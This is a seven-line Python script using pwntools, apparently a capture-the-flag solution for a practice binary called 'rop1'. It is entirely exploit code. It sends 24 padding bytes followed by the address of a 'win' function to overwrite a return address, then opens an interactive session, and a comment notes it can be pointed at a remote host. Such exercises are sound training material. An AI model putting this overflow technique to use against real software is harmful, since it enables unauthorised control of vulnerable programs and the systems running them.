from pwn import *
io = process('./rop1') # or later: io = remote('HOST', PORT)
offset = 24
win_address = 0x401176
payload = b'A' * offset + p64(win_address)
io.sendafter(b'ROP 1', payload)
io.interactive()
